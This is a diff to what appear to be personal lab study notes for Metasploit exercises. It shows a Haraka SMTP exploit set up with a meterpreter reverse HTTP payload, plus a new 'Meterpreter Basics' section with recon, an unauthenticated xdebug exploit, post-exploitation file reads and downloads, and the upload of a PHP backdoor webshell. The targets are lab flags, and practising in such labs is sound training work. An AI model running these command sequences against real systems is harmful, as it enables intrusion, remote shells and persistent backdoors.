@@ -1180,7 +1180,7 @@ id
 ```
 nmap -sS -sV 192.3.161.3
 use exploit/linux/smtp/haraka
-set SRVPORT 9898
+set SRVPORT 9898    #incoming connections from the payload
 set email_to root@attackdefense.test
 set payload linux/x64/meterpreter_reverse_http
 set rhost 192.150.137.3
@@ -1188,6 +1188,33 @@ set LHOST 192.150.137.2
 exploit
 
 ```
+64) Meterpreter Basics  **NOTE** 
 
+```
+nmap -sS -sV 192.189.123.3
+dirb http://192.189.123.3
+curl http://192.189.123.3/phpinfo.php
+msfconsole
+use exploit/unix/http/xdebug_unauth_exec
+set RHOSTS 192.189.123.3
+set LHOST 192.189.123.2
+exploit
+lpwd
+lls
+cat /app/flag1
+edit /app/flag1
+cd "Secret Files"
+cat .flag2
+download flag5.zip
+unzip flag5.zip
+cat list
+rm flag5.zip
+checksum md5 /bin/bash
+getenv PATH
+search -d /usr/bin -f *ckdo*
+lcd tools
+upload /usr/share/webshells/php/php-backdoor.php
+https://www.offsec.com/metasploit-unleashed/meterpreter-basics/
 
+```
 
